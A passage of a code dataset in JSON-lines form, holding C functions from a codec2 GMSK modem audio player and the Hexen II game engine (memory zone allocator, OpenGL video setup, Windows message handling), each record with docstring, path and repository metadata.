Ignoring\\n\",udpsize);\n\t\t\tcontinue;\n\t\t} else if (udpsize > C2ENCAP_SIZE_VOICE1200) {\n\t\t\tfprintf(stderr,\"Warning: received C2ENCAP VOICE1200 with to large size: %d octets! Ignoring extra data\\n\",udpsize);\n\t\t};\n\n\t} else if (*c2encap_type == C2ENCAP_DATA_VOICE1400) {\n\t\tif (udpsize < C2ENCAP_SIZE_VOICE1400 ) {\n\t\t\tfprintf(stderr,\"Warning: received C2ENCAP VOICE1400 with to small size: %d octets! Ignoring\\n\",udpsize);\n\t\t\tcontinue;\n\t\t} else if (udpsize > C2ENCAP_SIZE_VOICE1400) {\n\t\t\tfprintf(stderr,\"Warning: received C2ENCAP VOICE1400 with to large size: %d octets! Ignoring extra data\\n\",udpsize);\n\t\t};\n\t} else if (*c2encap_type == C2ENCAP_DATA_VOICE2400) {\n\t\tif (udpsize < C2ENCAP_SIZE_VOICE2400 ) {\n\t\t\tfprintf(stderr,\"Warning: received C2ENCAP VOICE2400 with to small size: %d octets! Ignoring\\n\",udpsize);\n\t\t\tcontinue;\n\t\t} else if (udpsize > C2ENCAP_SIZE_VOICE2400) {\n\t\t\tfprintf(stderr,\"Warning: received C2ENCAP VOICE2400 with to large size: %d octets! Ignoring extra data\\n\",udpsize);\n\t\t};\n\t} else {\n\t\tfprintf(stderr,\"Warning: received packet with unknown type of C2ENCAP type: 0X%02X. Ignoring!\\n\",*c2encap_type);\n\t\tcontinue;\n\t}; // end if\n\n\n\t// processing from here on depends on state\n\tif (state == 0) {\n\t\t// state 0, waiting for start data\n\n\t\tif (*c2encap_type == C2ENCAP_MARK_BEGIN) {\n\t\t\t// received start, go to state 1\n\t\t\tstate=1;\n\t\t\tcontinue;\n\t\t} else {\n\t\t\tfprintf(stderr,\"Warning: received packet of type 0X%02X in state 0. Ignoring packet! \\n\",*c2encap_type);\n\t\t\tcontinue;\n\t\t}; // end if\n\t} else if (state == 1) {\n\t\t// state 1: receiving voice data, until we receive a \"end\" marker\n\t\tif (*c2encap_type == C2ENCAP_MARK_END) {\n\t\t\t// end received. Go back to state 0\n\t\t\tstate=0;\n\t\t\tcontinue;\n\t\t} else if (*c2encap_type != C2ENCAP_DATA_VOICE1400) {\n\t\t\tfprintf(stderr,\"Warning: received packet of type 0X%02X in state 1. Ignoring packet! \\n\",*c2encap_type);\n\t\t\tcontinue;\n\t\t} else {\n\t\t\t// voice 1400 data packet. Decode and play out\n\n\t\t\t// first check if there is place to store the result\n\t\t\tnew_ptr_audio_write = global.ptr_audio_write+1;\n\t\t\tif (new_ptr_audio_write >= NUMBUFF) {\n\t\t\t\t// wrap around at NUMBUFF\n\t\t\t\tnew_ptr_audio_write=0;\n\t\t\t}; // end if\n\n\t\t\tif (new_ptr_audio_write == global.ptr_audio_read) {\n\t\t\t\t// oeps. No buffers available to write data\n\t\t\t\tfputc('B',stderr);\n\t\t\t} else {\n//\t\t\t\tfputc('Q',stderr);\n\n\n\t\t\t\t// decode codec2 frame\n  \t\t\t\tcodec2_decode(codec2, global.audiobuffer[new_ptr_audio_write],c2encap_begindata);\n\t\t\t\t\n\n\t\t\t\t// if not samplerate 8000, do rate conversion\n\t\t\t\tif (global.rate != 8000) {\n\t\t\t\t\t// convert int16 to float\n\t\t\t\t\tif (!inaudiobuffer_f) {\n\t\t\t\t\t\tfprintf(stderr,\"Internal error: inaudiobuffer_f not initialised! \\n\");\n\t\t\t\t\t\texit(-1);\n\t\t\t\t\t}; // \"end if\n\n\t\t\t\t\tif (!outaudiobuffer_f) {\n\t\t\t\t\t\tfprintf(stderr,\"Internal error: outaudiobuffer_f not initialised! \\n\");\n\t\t\t\t\t\texit(-1);\n\t\t\t\t\t}; // \"end if\n\n\n\t\t\t\t\tsrc_short_to_float_array(global.audiobuffer[new_ptr_audio_write],inaudiobuffer_f,320);\n\n\t\t\t\t\t// do conversion\n\t\t\t\t\tret=src_process(src,&src_data);\n\n\t\t\t\t\tif (ret) {\n\t\t\t\t\t\tfprintf(stderr,\"Warning: samplerate conversion error %d (%s)\\n\",ret,src_strerror(ret));\n\t\t\t\t\t}; // end if\n\n\t\t\t\t\t// some error checking\n\t\t\t\t\tif (src_data.output_frames_gen != global.numSample) {\n\t\t\t\t\t\tfprintf(stderr,\"Warning: number of frames generated by samplerateconvert should be %d, got %ld. \\n\",global.numSample,src_data.output_frames_gen);\n\t\t\t\t\t}; // end if\n\n\t\t\t\t\t// convert back from float to int, and store immediatly in ringbuffer\n\t\t\t\t\tsrc_float_to_short_array(outaudiobuffer_f,global.audiobuffer[new_ptr_audio_write],global.numSample );\n\t\t\t\t}; // end if (samplerate != 8000)\n\n\n\t\t\t\t// make stereo (duplicate channels) if needed\n\t\t\t\tif (global.stereo) {\n\t\t\t\t\tint loop;\n\t\t\t\t\tint16_t *p1, *p2;\n\n\t\t\t\t\tint lastsample_m, lastsample_s;\n\n\t\t\t\t\tlastsample_m = global.numSample - 1;\n\t\t\t\t\tlastsample_s = global.numSample*2 - 1;\n\n\t\t\t\t\t// codec2_decode returns a buffer of 16-bit samples, MONO\n\t\t\t\t\t// so duplicate all samples, start with last sample, move down to sample \"1\" (not 0);\n\t\t\t\t\tp1=&global.audiobuffer[new_ptr_audio_write][lastsample_s]; // last sample of buffer (320 samples stereo = 640 samples mono)\n\t\t\t\t\tp2=&global.audiobuffer[new_ptr_audio_write][lastsample_m]; // last sample of buffer (mono)\n\n\t\t\t\t\tfor (loop=0; loop < lastsample_m; loop++) {\n\t\t\t\t\t\t*p1 = *p2; p1--; // copy 1st octet, move down \"write\" pointer\n\t\t\t\t\t\t*p1 = *p2; p1--; p2--; // copy 2nd time, move down both pointers\n\t\t\t\t\t}; // end if\n\n\t\t\t\t\t// last sample, just copy (no need anymore to move pointers)\n\t\t\t\t\t*p1 = *p2;\n\t\t\t\t}; // end if\n\n\t\t\t\t// move up pointer in global vars\n\t\t\t\tglobal.ptr_audio_write=new_ptr_audio_write;\n\t\t\t}; // end if\n\n\t\t}; // end if\n\t} else {\n\t\tfprintf(stderr,\"Internal Error: unknow state %d in audioplay main loop. Should not happen. Exiting!!!\\n\",state);\n\t\texit(-1);\n\t}; // end if\n\n}", "path": "gmskmodem_codec2\\development\\beta\\audiotools\\audioplay_multirate_callback.c", "repo_name": "on1arf/gmsk", "stars": 39, "license": "None", "language": "c", "size": 1250}
{"docstring": "/*\n=================\nVID_NumModes_f\n=================\n*/\n", "func_signal": "void VID_NumModes_f (void)", "code": "{\n\n\tif (nummodes == 1)\n\t\tCon_Printf (\"%d video mode is available\\n\", nummodes);\n\telse\n\t\tCon_Printf (\"%d video modes are available\\n\", nummodes);\n}", "path": "H2MP\\code\\gl_vidnt.c", "repo_name": "videogamepreservation/hexen2", "stars": 39, "license": "None", "language": "c", "size": 2177}
{"docstring": "/*\n========================\nZ_Malloc\n========================\n*/\n", "func_signal": "void *Z_Malloc (int size)", "code": "{\n\tvoid\t*buf;\n\t\nZ_CheckHeap ();\t// DEBUG\n\tbuf = Z_TagMalloc (size, 1);\n\tif (!buf)\n\t\tSys_Error (\"Z_Malloc: failed on allocation of %i bytes\",size);\n\tmemset (buf, 0, size);\n\n\treturn buf;\n}", "path": "H2W\\Client\\zone.c", "repo_name": "videogamepreservation/hexen2", "stars": 39, "license": "None", "language": "c", "size": 2177}
{"docstring": "/*\n========================\nMemory_Init\n========================\n*/\n", "func_signal": "void Memory_Init (void *buf, int size)", "code": "{\n\tint p;\n\tint zonesize = DYNAMIC_SIZE;\n\n\thunk_base = buf;\n\thunk_size = size;\n\thunk_low_used = 0;\n\thunk_high_used = 0;\n\t\n\tCache_Init ();\n\tp = COM_CheckParm (\"-zone\");\n\tif (p)\n\t{\n\t\tif (p < com_argc-1)\n\t\t\tzonesize = atoi (com_argv[p+1]) * 1024;\n\t\telse\n\t\t\tSys_Error (\"Memory_Init: you must specify a size in KB after -zone\");\n\t}\n\tmainzone = Hunk_AllocName ( zonesize, \"zone\" );\n\tZ_ClearZone (mainzone, zonesize);\n}", "path": "H2W\\Client\\zone.c", "repo_name": "videogamepreservation/hexen2", "stars": 39, "license": "None", "language": "c", "size": 2177}
{"docstring": "/*\n============\nCache_Init\n\n============\n*/\n", "func_signal": "void Cache_Init (void)", "code": "{\n\tcache_head.next = cache_head.prev = &cache_head;\n\tcache_head.lru_next = cache_head.lru_prev = &cache_head;\n\n\tCmd_AddCommand (\"flush\", Cache_Flush);\n}", "path": "H2W\\Client\\zone.c", "repo_name": "videogamepreservation/hexen2", "stars": 39, "license": "None", "language": "c", "size": 2177}
{"docstring": "/*\n=================\nVID_DescribeModes_f\n=================\n*/\n", "func_signal": "void VID_DescribeModes_f (void)", "code": "{\n\tint\t\t\ti, lnummodes, t;\n\tchar\t\t*pinfo;\n\tvmode_t\t\t*pv;\n\n\tlnummodes = VID_NumModes ();\n\n\tt = leavecurrentmode;\n\tleavecurrentmode = 0;\n\n\tfor (i=1 ; i<lnummodes ; i++)\n\t{\n\t\tpv = VID_GetModePtr (i);\n\t\tpinfo = VID_GetExtModeDescription (i);\n\t\tCon_Printf (\"%2d: %s\\n\", i, pinfo);\n\t}\n\n\tleavecurrentmode = t;\n}", "path": "H2MP\\code\\gl_vidnt.c", "repo_name": "videogamepreservation/hexen2", "stars": 39, "license": "None", "language": "c", "size": 2177}
{"docstring": "/*\n=================\nGL_BeginRendering\n\n=================\n*/\n", "func_signal": "void GL_BeginRendering (int *x, int *y, int *width, int *height)", "code": "{\n\textern cvar_t gl_clear;\n\n\t*x = *y = 0;\n\t*width = WindowRect.right - WindowRect.left;\n\t*height = WindowRect.bottom - WindowRect.top;\n\n//    if (!wglMakeCurrent( maindc, baseRC ))\n//\t\tSys_Error (\"wglMakeCurrent failed\");\n\n//\tglViewport (*x, *y, *width, *height);\n}", "path": "H2MP\\code\\gl_vidnt.c", "repo_name": "videogamepreservation/hexen2", "stars": 39, "license": "None", "language": "c", "size": 2177}
{"docstring": "/*\nvoid Check3DfxMarkPaletteTextureExtension( void )\n{\n\tchar *tmp;\n\tqboolean found_ext = false;\n\n\ttmp = ( unsigned char * )glGetString( GL_EXTENSIONS );\n\twhile( *tmp )\n\t{\n\t\tif (strncmp((const char*)tmp, FX_SET_PALETTE_EXT_STRING, strlen(FX_SET_PALETTE_EXT_STRING)) == 0)\n\t\t\tfound_ext = TRUE;\n\t\ttmp++;\n\t}\n\n\tfxMarkPalTextureExtension = NULL;\n\tif( !found_ext )\n\t\treturn;\n\tif ((fxMarkPalTextureExtension = (FX_MARK_PAL_TEXTURE_EXT)\n\t\twglGetProcAddress((LPCSTR) FX_MARK_PAL_TEXTURE_EXT_STRING)) == NULL)\n\t{\n\t\tSys_Error (\"GetProcAddress for fxMarkPalTextureExtension failed\");\n\t\treturn;\n\t}\n}\n*/\n", "func_signal": "void CheckTextureExtensions (void)", "code": "{\n\tchar\t\t*tmp;\n\tqboolean\ttexture_ext;\n\tHINSTANCE\thInstGL;\n\n\ttexture_ext = FALSE;\n\t/* check for texture extension */\n\ttmp = (unsigned char *)glGetString(GL_EXTENSIONS);\n\twhile (*tmp)\n\t{\n\t\tif (strncmp((const char*)tmp, TEXTURE_EXT_STRING, strlen(TEXTURE_EXT_STRING)) == 0)\n\t\t\ttexture_ext = TRUE;\n\t\ttmp++;\n\t}\n\n\tif (!texture_ext || COM_CheckParm (\"-gl11\") )\n\t{\n\t\thInstGL = LoadLibrary(\"opengl32.dll\");\n\t\t\n\t\tif (hInstGL == NULL)\n\t\t\tSys_Error (\"Couldn't load opengl32.dll\\n\");\n\n\t\tbindTexFunc = (void *)GetProcAddress(hInstGL,\"glBindTexture\");\n\n\t\tif (!bindTexFunc)\n\t\t\tSys_Error (\"No texture objects!\");\n\t\treturn;\n\t}\n\n/* load library and get procedure adresses for texture extension API */\n\tif ((bindTexFunc = (BINDTEXFUNCPTR)\n\t\twglGetProcAddress((LPCSTR) \"glBindTextureEXT\")) == NULL)\n\t{\n\t\tSys_Error (\"GetProcAddress for BindTextureEXT failed\");\n\t\treturn;\n\t}\n}", "path": "H2MP\\code\\gl_vidnt.c", "repo_name": "videogamepreservation/hexen2", "stars": 39, "license": "None", "language": "c", "size": 2177}
{"docstring": "/*\n==============\nCache_Check\n==============\n*/\n", "func_signal": "void *Cache_Check (cache_user_t *c)", "code": "{\n\tcache_system_t\t*cs;\n\n\tif (!c->data)\n\t\treturn NULL;\n\n\tcs = ((cache_system_t *)c->data) - 1;\n\n// move to head of LRU\n\tCache_UnlinkLRU (cs);\n\tCache_MakeLRU (cs);\n\t\n\treturn c->data;\n}", "path": "H2W\\Client\\zone.c", "repo_name": "videogamepreservation/hexen2", "stars": 39, "license": "None", "language": "c", "size": 2177}
{"docstring": "/* main window procedure */\n", "func_signal": "LONG WINAPI MainWndProc (\n    HWND    hWnd,\n    UINT    uMsg,\n    WPARAM  wParam,\n    LPARAM  lParam)", "code": "{\n    LONG    lRet = 1;\n\tint\t\tfwKeys, xPos, yPos, fActive, fMinimized, temp;\n\n    switch (uMsg)\n    {\n\t\tcase WM_CREATE:\n\t\t\tbreak;\n\n\t\tcase WM_MOVE:\n\t\t\twindow_x = (int) LOWORD(lParam);\n\t\t\twindow_y = (int) HIWORD(lParam);\n\t\t\tVID_UpdateWindowStatus ();\n\t\t\tbreak;\n\n\t\tcase WM_KEYDOWN:\n\t\tcase WM_SYSKEYDOWN:\n\t\t\tKey_Event (MapKey(lParam), true);\n\t\t\tbreak;\n\t\t\t\n\t\tcase WM_KEYUP:\n\t\tcase WM_SYSKEYUP:\n\t\t\tKey_Event (MapKey(lParam), false);\n\t\t\tbreak;\n\n\t\tcase WM_SYSCHAR:\n\t\t// keep Alt-Space from happening\n\t\t\tbreak;\n\n\t// this is complicated because Win32 seems to pack multiple mouse events into\n\t// one update sometimes, so we always check all states and look for events\n\t\tcase WM_LBUTTONDOWN:\n\t\tcase WM_LBUTTONUP:\n\t\tcase WM_RBUTTONDOWN:\n\t\tcase WM_RBUTTONUP:\n\t\tcase WM_MBUTTONDOWN:\n\t\tcase WM_MBUTTONUP:\n\t\tcase WM_MOUSEMOVE:\n\t\t\ttemp = 0;\n\n\t\t\tif (wParam & MK_LBUTTON)\n\t\t\t\ttemp |= 1;\n\n\t\t\tif (wParam & MK_RBUTTON)\n\t\t\t\ttemp |= 2;\n\n\t\t\tif (wParam & MK_MBUTTON)\n\t\t\t\ttemp |= 4;\n\n\t\t\tIN_MouseEvent (temp);\n\n\t\t\tbreak;\n\n\n    \tcase WM_SIZE:\n            break;\n\n   \t    case WM_CLOSE:\n\t\t\tif (MessageBox (mainwindow, \"Are you sure you want to quit?\", \"Confirm Exit\",\n\t\t\t\t\t\tMB_YESNO | MB_SETFOREGROUND | MB_ICONQUESTION) == IDYES)\n\t\t\t{\n\t\t\t\tSys_Quit ();\n\t\t\t}\n\n\t        break;\n\n\t\tcase WM_ACTIVATE:\n\t\t\tfActive = LOWORD(wParam);\n\t\t\tfMinimized = (BOOL) HIWORD(wParam);\n\t\t\tAppActivate(!(fActive == WA_INACTIVE), fMinimized);\n\n\t\t// fix the leftover Alt from any Alt-Tab or the like that switched us away\n\t\t\tClearAllStates ();\n\n\t\t\tbreak;\n\n   \t    case WM_DESTROY:\n        {\n\t\t\tif (dibwindow)\n\t\t\t\tDestroyWindow (dibwindow);\n\n            PostQuitMessage (0);\n        }\n        break;\n\n\t\tcase MM_MCINOTIFY:\n            lRet = CDAudio_MessageHandler (hWnd, uMsg, wParam, lParam);\n\t\t\tbreak;\n\n    \tdefault:\n            /* pass all unhandled messages to DefWindowProc */\n            lRet = DefWindowProc (hWnd, uMsg, wParam, lParam);\n        break;\n    }\n\n    /* return 1 if handled message, 0 if not */\n    return lRet;\n}", "path": "H2MP\\code\\gl_vidnt.c", "repo_name": "videogamepreservation/hexen2", "stars": 39, "license": "None", "language": "c", "size": 2177}
{"docstring": "/*\n============\nCache_FreeHigh\n\nThrow things out until the hunk can be expanded to the given point\n============\n*/\n", "func_signal": "void Cache_FreeHigh (int new_high_hunk)", "code": "{\n\tcache_system_t\t*c, *prev;\n\t\n\tprev = NULL;\n\twhile (1)\n\t{\n\t\tc = cache_head.prev;\n\t\tif (c == &cache_head)\n\t\t\treturn;\t\t// nothing in cache at all\n\t\tif ( (byte *)c + c->size <= hunk_base + hunk_size - new_high_hunk)\n\t\t\treturn;\t\t// there is space to grow the hunk\n\t\tif (c == prev)\n\t\t\tCache_Free (c->user);\t// didn't move out of the way\n\t\telse\n\t\t{\n\t\t\tCache_Move (c);\t// try to move it\n\t\t\tprev = c;\n\t\t}\n\t}\n}", "path": "H2W\\Client\\zone.c", "repo_name": "videogamepreservation/hexen2", "stars": 39, "license": "None", "language": "c", "size": 2177}
{"docstring": "//==========================================================================\n", "func_signal": "BOOL bSetupPixelFormat(HDC hDC)", "code": "{\n    static PIXELFORMATDESCRIPTOR pfd = {\n\tsizeof(PIXELFORMATDESCRIPTOR),\t// size of this pfd\n\t1,\t\t\t\t// version number\n\tPFD_DRAW_TO_WINDOW \t\t// support window\n\t|  PFD_SUPPORT_OPENGL \t// support OpenGL\n\t|  PFD_DOUBLEBUFFER ,\t// double buffered\n\tPFD_TYPE_RGBA,\t\t\t// RGBA type\n\t24,\t\t\t\t// 24-bit color depth\n\t0, 0, 0, 0, 0, 0,\t\t// color bits ignored\n\t0,\t\t\t\t// no alpha buffer\n\t0,\t\t\t\t// shift bit ignored\n\t0,\t\t\t\t// no accumulation buffer\n\t0, 0, 0, 0, \t\t\t// accum bits ignored\n\t32,\t\t\t\t// 32-bit z-buffer\t\n\t0,\t\t\t\t// no stencil buffer\n\t0,\t\t\t\t// no auxiliary buffer\n\tPFD_MAIN_PLANE,\t\t\t// main layer\n\t0,\t\t\t\t// reserved\n\t0, 0, 0\t\t\t\t// layer masks ignored\n    };\n    int pixelformat;\n\n    if ( (pixelformat = ChoosePixelFormat(hDC, &pfd)) == 0 )\n    {\n        MessageBox(NULL, \"ChoosePixelFormat failed\", \"Error\", MB_OK);\n        return FALSE;\n    }\n\n    if (SetPixelFormat(hDC, pixelformat, &pfd) == FALSE)\n    {\n        MessageBox(NULL, \"SetPixelFormat failed\", \"Error\", MB_OK);\n        return FALSE;\n    }\n\n    return TRUE;\n}", "path": "H2MP\\code\\gl_vidnt.c", "repo_name": "videogamepreservation/hexen2", "stars": 39, "license": "None", "language": "c", "size": 2177}
{"docstring": "/*\n===================\nHunk_AllocName\n===================\n*/\n", "func_signal": "void *Hunk_AllocName (int size, char *name)", "code": "{\n\thunk_t\t*h;\n\t\n#ifdef PARANOID\n\tHunk_Check ();\n#endif\n\n\tif (size < 0)\n\t\tSys_Error (\"Hunk_Alloc: bad size: %i\", size);\n\t\t\n\tsize = sizeof(hunk_t) + ((size+15)&~15);\n\t\n\tif (hunk_size - hunk_low_used - hunk_high_used < size)\n//\t\tSys_Error (\"Hunk_Alloc: failed on %i bytes\",size);\n#ifdef _WIN32\n\t  \tSys_Error (\"Not enough RAM allocated.  Try starting using \\\"-heapsize 16000\\\" on the HexenWorld command line.\");\n#else\n\t  \tSys_Error (\"Not enough RAM allocated.  Try starting using \\\"-mem 16\\\" on the HexenWorld command line.\");\n#endif\n\t\n\th = (hunk_t *)(hunk_base + hunk_low_used);\n\thunk_low_used += size;\n\n\tCache_FreeLow (hunk_low_used);\n\n\tmemset (h, 0, size);\n\t\n\th->size = size;\n\th->sentinal = HUNK_SENTINAL;\n\tstrncpy (h->name, name, 8);\n\t\n\treturn (void *)(h+1);\n}", "path": "H2W\\Client\\zone.c", "repo_name": "videogamepreservation/hexen2", "stars": 39, "license": "None", "language": "c", "size": 2177}
{"docstring": "/*\n==============\nHunk_Print\n\nIf \"all\" is specified, every single allocation is printed.\nOtherwise, allocations with the same name will be totaled up before printing.\n==============\n*/\n", "func_signal": "void Hunk_Print (qboolean all)", "code": "{\n\thunk_t\t*h, *next, *endlow, *starthigh, *endhigh;\n\tint\t\tcount, sum;\n\tint\t\ttotalblocks;\n\tchar\tname[9];\n\n\tname[8] = 0;\n\tcount = 0;\n\tsum = 0;\n\ttotalblocks = 0;\n\t\n\th = (hunk_t *)hunk_base;\n\tendlow = (hunk_t *)(hunk_base + hunk_low_used);\n\tstarthigh = (hunk_t *)(hunk_base + hunk_size - hunk_high_used);\n\tendhigh = (hunk_t *)(hunk_base + hunk_size);\n\n\tCon_Printf (\"          :%8i total hunk size\\n\", hunk_size);\n\tCon_Printf (\"-------------------------\\n\");\n\n\twhile (1)\n\t{\n\t//\n\t// skip to the high hunk if done with low hunk\n\t//\n\t\tif ( h == endlow )\n\t\t{\n\t\t\tCon_Printf (\"-------------------------\\n\");\n\t\t\tCon_Printf (\"          :%8i REMAINING\\n\", hunk_size - hunk_low_used - hunk_high_used);\n\t\t\tCon_Printf (\"-------------------------\\n\");\n\t\t\th = starthigh;\n\t\t}\n\t\t\n\t//\n\t// if totally done, break\n\t//\n\t\tif ( h == endhigh )\n\t\t\tbreak;\n\n\t//\n\t// run consistancy checks\n\t//\n\t\tif (h->sentinal != HUNK_SENTINAL)\n\t\t\tSys_Error (\"Hunk_Check: trahsed sentinal\");\n\t\tif (h->size < 16 || h->size + (byte *)h - hunk_base > hunk_size)\n\t\t\tSys_Error (\"Hunk_Check: bad size\");\n\t\t\t\n\t\tnext = (hunk_t *)((byte *)h+h->size);\n\t\tcount++;\n\t\ttotalblocks++;\n\t\tsum += h->size;\n\n\t//\n\t// print the single block\n\t//\n\t\tmemcpy (name, h->name, 8);\n\t\tif (all)\n\t\t\tCon_Printf (\"%8p :%8i %8s\\n\",h, h->size, name);\n\t\t\t\n\t//\n\t// print the total\n\t//\n\t\tif (next == endlow || next == endhigh || \n\t\tstrncmp (h->name, next->name, 8) )\n\t\t{\n\t\t\tif (!all)\n\t\t\t\tCon_Printf (\"          :%8i %8s (TOTAL)\\n\",sum, name);\n\t\t\tcount = 0;\n\t\t\tsum = 0;\n\t\t}\n\n\t\th = next;\n\t}\n\n\tCon_Printf (\"-------------------------\\n\");\n\tCon_Printf (\"%8i total blocks\\n\", totalblocks);\n\t\n}", "path": "H2W\\Client\\zone.c", "repo_name": "videogamepreservation/hexen2", "stars": 39, "license": "None", "language": "c", "size": 2177}
{"docstring": "/*\n=================\nHunk_TempAlloc\n\nReturn space from the top of the hunk\n=================\n*/\n", "func_signal": "void *Hunk_TempAlloc (int size)", "code": "{\n\tvoid\t*buf;\n\n\tsize = (size+15)&~15;\n\t\n\tif (hunk_tempactive)\n\t{\n\t\tHunk_FreeToHighMark (hunk_tempmark);\n\t\thunk_tempactive = false;\n\t}\n\t\n\thunk_tempmark = Hunk_HighMark ();\n\n\tbuf = Hunk_HighAllocName (size, \"temp\");\n\n\thunk_tempactive = true;\n\n\treturn buf;\n}", "path": "H2W\\Client\\zone.c", "repo_name": "videogamepreservation/hexen2", "stars": 39, "license": "None", "language": "c", "size": 2177}
{"docstring": "/*\n===================\nVID_Init\n===================\n*/\n", "func_signal": "void\tVID_Init (unsigned char *palette)", "code": "{\n\tint\t\ti, existingmode;\n\tint\t\tbasenummodes, width, height, bpp, findbpp, done;\n\tbyte\t*ptmp;\n\tchar\tgldir[MAX_OSPATH];\n\tHDC\t\thdc;\n\tDEVMODE\tdevmode;\n\n\tCvar_RegisterVariable (&vid_mode);\n\tCvar_RegisterVariable (&vid_wait);\n\tCvar_RegisterVariable (&vid_nopageflip);\n\tCvar_RegisterVariable (&_vid_wait_override);\n\tCvar_RegisterVariable (&_vid_default_mode);\n\tCvar_RegisterVariable (&_vid_default_mode_win);\n\tCvar_RegisterVariable (&vid_config_x);\n\tCvar_RegisterVariable (&vid_config_y);\n\tCvar_RegisterVariable (&vid_stretch_by_2);\n\tCvar_RegisterVariable (&_windowed_mouse);\n\tCvar_RegisterVariable (&gl_ztrick);\n\n\tCmd_AddCommand (\"vid_nummodes\", VID_NumModes_f);\n\tCmd_AddCommand (\"vid_describecurrentmode\", VID_DescribeCurrentMode_f);\n\tCmd_AddCommand (\"vid_describemode\", VID_DescribeMode_f);\n\tCmd_AddCommand (\"vid_describemodes\", VID_DescribeModes_f);\n\tCmd_AddCommand (\"vid_switch\", VID_Switch_f);\n\n\thIcon = LoadIcon (global_hInstance, MAKEINTRESOURCE (IDI_ICON2));\n\n\tVID_InitDIB (global_hInstance);\n\tbasenummodes = nummodes = 1;\n\n\tVID_InitFullDIB (global_hInstance);\n\n\tif (COM_CheckParm(\"-window\"))\n\t{\n\t\thdc = GetDC (NULL);\n\n\t\tif (GetDeviceCaps(hdc, RASTERCAPS) & RC_PALETTE)\n\t\t{\n\t\t\tSys_Error (\"Can't run in non-RGB mode\");\n\t\t}\n\n\t\tReleaseDC (NULL, hdc);\n\n\t\twindowed = true;\n\n\t\tvid_default = MODE_WINDOWED;\n\t}\n\telse\n\t{\n\t\tif (nummodes == 1)\n\t\t\tSys_Error (\"No RGB fullscreen modes available\");\n\n\t\twindowed = false;\n\n\t\tif (COM_CheckParm(\"-mode\"))\n\t\t{\n\t\t\tvid_default = atoi(com_argv[COM_CheckParm(\"-mode\")+1]);\n\t\t}\n\t\telse\n\t\t{\n\t\t\tif (COM_CheckParm(\"-current\"))\n\t\t\t{\n\t\t\t\tmodelist[MODE_FULLSCREEN_DEFAULT].width =\n\t\t\t\t\t\tGetSystemMetrics (SM_CXSCREEN);\n\t\t\t\tmodelist[MODE_FULLSCREEN_DEFAULT].height =\n\t\t\t\t\t\tGetSystemMetrics (SM_CYSCREEN);\n\t\t\t\tvid_default = MODE_FULLSCREEN_DEFAULT;\n\t\t\t\tleavecurrentmode = 1;\n\t\t\t}\n\t\t\telse\n\t\t\t{\n\t\t\t\tif (COM_CheckParm(\"-width\"))\n\t\t\t\t{\n\t\t\t\t\twidth = atoi(com_argv[COM_CheckParm(\"-width\")+1]);\n\t\t\t\t}\n\t\t\t\telse\n\t\t\t\t{\n\t\t\t\t\twidth = 640;\n\t\t\t\t}\n\n\t\t\t\tif (COM_CheckParm(\"-bpp\"))\n\t\t\t\t{\n\t\t\t\t\tbpp = atoi(com_argv[COM_CheckParm(\"-bpp\")+1]);\n\t\t\t\t\tfindbpp = 0;\n\t\t\t\t}\n\t\t\t\telse\n\t\t\t\t{\n\t\t\t\t\tbpp = 15;\n\t\t\t\t\tfindbpp = 1;\n\t\t\t\t}\n\n\t\t\t\tif (COM_CheckParm(\"-height\"))\n\t\t\t\t\theight = atoi(com_argv[COM_CheckParm(\"-height\")+1]);\n\n\t\t\t// if they want to force it, add the specified mode to the list\n\t\t\t\tif (COM_CheckParm(\"-force\") && (nummodes < MAX_MODE_LIST))\n\t\t\t\t{\n\t\t\t\t\tmodelist[nummodes].type = MS_FULLDIB;\n\t\t\t\t\tmodelist[nummodes].width = width;\n\t\t\t\t\tmodelist[nummodes].height = height;\n\t\t\t\t\tmodelist[nummodes].modenum = 0;\n\t\t\t\t\tmodelist[nummodes].halfscreen = 0;\n\t\t\t\t\tmodelist[nummodes].dib = 1;\n\t\t\t\t\tmodelist[nummodes].fullscreen = 1;\n\t\t\t\t\tmodelist[nummodes].bpp = bpp;\n\t\t\t\t\tsprintf (modelist[nummodes].modedesc, \"%dx%dx%d\",\n\t\t\t\t\t\t\t devmode.dmPelsWidth, devmode.dmPelsHeight,\n\t\t\t\t\t\t\t devmode.dmBitsPerPel);\n\n\t\t\t\t\tfor (i=nummodes, existingmode = 0 ; i<nummodes ; i++)\n\t\t\t\t\t{\n\t\t\t\t\t\tif ((modelist[nummodes].width == modelist[i].width)   &&\n\t\t\t\t\t\t\t(modelist[nummodes].height == modelist[i].height) &&\n\t\t\t\t\t\t\t(modelist[nummodes].bpp == modelist[i].bpp))\n\t\t\t\t\t\t{\n\t\t\t\t\t\t\texistingmode = 1;\n\t\t\t\t\t\t\tbreak;\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\n\t\t\t\t\tif (!existingmode)\n\t\t\t\t\t{\n\t\t\t\t\t\tnummodes++;\n\t\t\t\t\t}\n\t\t\t\t}\n\n\t\t\t\tdone = 0;\n\n\t\t\t\tdo\n\t\t\t\t{\n\t\t\t\t\tif (COM_CheckParm(\"-height\"))\n\t\t\t\t\t{\n\t\t\t\t\t\theight = atoi(com_argv[COM_CheckParm(\"-height\")+1]);\n\n\t\t\t\t\t\tfor (i=1, vid_default=0 ; i<nummodes ; i++)\n\t\t\t\t\t\t{\n\t\t\t\t\t\t\tif ((modelist[i].width == width) &&\n\t\t\t\t\t\t\t\t(modelist[i].height == height) &&\n\t\t\t\t\t\t\t\t(modelist[i].bpp == bpp))\n\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\tvid_default = i;\n\t\t\t\t\t\t\t\tdone = 1;\n\t\t\t\t\t\t\t\tbreak;\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t\telse\n\t\t\t\t\t{\n\t\t\t\t\t\tfor (i=1, vid_default=0 ; i<nummodes ; i++)\n\t\t\t\t\t\t{\n\t\t\t\t\t\t\tif ((modelist[i].width == width) && (modelist[i].bpp == bpp))\n\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\tvid_default = i;\n\t\t\t\t\t\t\t\tdone = 1;\n\t\t\t\t\t\t\t\tbreak;\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\n\t\t\t\t\tif (!done)\n\t\t\t\t\t{\n\t\t\t\t\t\tif (findbpp)\n\t\t\t\t\t\t{\n\t\t\t\t\t\t\tswitch (bpp)\n\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\tcase 15:\n\t\t\t\t\t\t\t\tbpp = 16;\n\t\t\t\t\t\t\t\tbreak;\n\t\t\t\t\t\t\tcase 